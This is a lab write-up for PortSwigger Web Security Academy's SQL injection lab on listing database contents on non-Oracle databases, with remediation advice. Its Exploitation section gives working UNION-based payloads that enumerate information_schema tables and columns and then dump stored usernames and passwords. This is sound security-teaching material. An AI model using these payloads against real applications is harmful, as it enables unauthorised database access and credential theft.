# SQL Injection: SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection via UNION Attack, Schema Enumeration (CWE-89)

## Lab Objective
Unlike the earlier `UNION` attack labs, the name of the credentials table and its columns are **not given**. Exploit the category filter's `UNION` injection to enumerate the database's own schema metadata — discovering the relevant table name and column names from scratch — then extract and use the administrator's credentials to log in.

## Vulnerability Overview
Every previous `UNION`-based SQL injection lab in this portfolio assumed the attacker already knew the target table was called `users`. Real-world databases rarely make this convenient, and this lab removes that assumption entirely — credential tables here are deliberately named with random suffixes (e.g. `users_a1b2c3`), making a guessed `FROM users` query useless.

The solution relies on a feature present in virtually every SQL database **except Oracle** (which has its own separate mechanism, covered in a companion lab): the **INFORMATION_SCHEMA**, a standardized set of read-only views that describe the database's own structure — every table that exists, every column within each table, their data types, and more. Critically, `information_schema` is itself just a regular, queryable set of views: a `UNION SELECT` injection can query it exactly as it would query any application table, which means an attacker with a confirmed `UNION` injection point effectively has a complete, interactive map of the database's structure available to them, with no prior knowledge required.

This turns a single confirmed injection point into a self-service schema browser:
- `information_schema.tables` — lists every table name in the database.
- `information_schema.columns` — lists every column name, filterable by table, for any table the attacker has discovered.

## Methodology
1. **Re-establish the `UNION` injection point.** Determine the column count and identify the text-compatible column(s), exactly as in the earlier `UNION` attack labs.
2. **Query `information_schema.tables`** in place of application data, to retrieve a list of every table name in the database.
3. **Identify the credentials table** from the returned list by its naming pattern (typically something resembling `users_<random suffix>`).
4. **Query `information_schema.columns`**, filtered to the discovered table name, to retrieve its column names.
5. **Identify the username and password columns** from the returned list by their naming pattern.
6. **Query the actual credentials table directly**, using the now-known table and column names, to retrieve the administrator's username and password.
7. **Log in using the extracted credentials.**

---

## Exploitation

**Step 1:** Intercept the category filter request and send it to **Repeater**:

```http
GET /filter?category=Gifts HTTP/1.1
```

**Step 2:** Confirm the column count and text-compatible positions using standard `UNION` enumeration:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
GET /filter?category=Gifts'+UNION+SELECT+'a','b'--
```

Confirming two columns, both string-compatible.

**Step 3:** Query the database's table listing by substituting `information_schema.tables` for the application's own table:

```http
GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

**Step 4:** The response renders a full list of table names present in the database, intermixed with the normal product listing. Scanning this list reveals an entry clearly distinct from the application's own product-related tables — something like:

```
users_a1b2c3
```

**Step 5:** Query the column names of this specific table:

```http
GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_a1b2c3'--
```

**Step 6:** The response lists every column in that table — for example:

```
username_x1y2z3
password_p9q8r7
```

**Step 7:** With the table and both column names now known, query the table directly for its actual contents:

```http
GET /filter?category=Gifts'+UNION+SELECT+username_x1y2z3,password_p9q8r7+FROM+users_a1b2c3--
```

**Step 8:** The response renders every row of the table — usernames paired with their passwords — in place of the product listing. Locate the `administrator` row and extract the associated password.

**Step 9:** Log in using the discovered `administrator` credentials to solve the lab.

**Why it works:** `information_schema` exists specifically to be queried like any other table, because database tooling (ORMs, admin consoles, documentation generators) legitimately needs a standardized way to introspect schema structure at runtime. That same design choice is exactly what makes it dangerous in the presence of an unrestricted `UNION` injection point: the database makes no distinction between "a query written by the application developer" and "a query smuggled in through unsanitised user input" — both are simply SQL, and both have identical read access to these metadata views by default. An attacker doesn't need any prior knowledge of the schema at all; the database is willing to disclose its own structure, one query at a time, using the exact same injection mechanics already established for exfiltrating application data.

## Impact
- **Removes the "known table name" assumption entirely from SQL injection exploitation** — real-world engagements almost never have the luxury of a conveniently-named `users` table, making schema enumeration via `information_schema` an essential, non-optional step in any genuine `UNION`-based attack.
- **Full database structure disclosure**, not just the eventual target table — an attacker following this methodology sees every table in the database along the way, which often reveals additional sensitive data (payment details, internal configuration, other users' PII) well beyond the original objective.
- **Demonstrates that `UNION` injection severity is bounded only by what the database account can read** — once the injection point exists, the entire schema is effectively enumerable, not just the one table the application's own queries happen to touch.

## Remediation
- **Use parameterised queries (prepared statements) universally.** This remains the definitive fix across the entire SQL injection series — if input cannot alter query structure, `information_schema` enumeration via injection is impossible regardless of how much metadata the database technically exposes.
- **Apply least-privilege database accounts.** The application's database user should ideally be restricted from querying `information_schema` at all if the application's own logic never requires it — though note this is a depth-of-defense measure, not a substitute for parameterisation, since many database engines grant this access by default to any authenticated role.
- **Avoid descriptive or predictable table/column naming conventions for sensitive data** as a minor obstruction — though this lab's randomized suffixes demonstrate this provides essentially no real protection once `information_schema` is queryable; it only shifts the attacker's first step from guessing to enumerating.
- **Monitor for queries referencing `information_schema`, `pg_catalog`, or equivalent system catalogs** originating from application-layer traffic, as a strong, fairly low-false-positive signal of active reconnaissance.

## Key Takeaways
- `information_schema.tables` and `information_schema.columns` together form a nearly universal (non-Oracle) schema enumeration primitive — this exact two-query pattern should be a default next step the moment a `UNION` injection is confirmed and the target table name isn't already known.
- Randomized or obscured table/column names provide negligible real security value against an attacker with a working injection point — they add a small amount of manual enumeration effort, not a meaningful barrier.
- This lab demonstrates the natural, complete arc of `UNION`-based exploitation: confirm the injection → determine column count/type → enumerate schema → extract target data — a sequence worth having fully memorized as a repeatable methodology, not a one-off lab solution.
- Oracle's lack of a standard `information_schema` (using `all_tables`/`all_tab_columns` instead) is precisely why this technique is dialect-dependent — reinforcing, again, why confirming the database engine (per the version-fingerprinting lab) is a prerequisite step before schema enumeration, not an optional detail.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.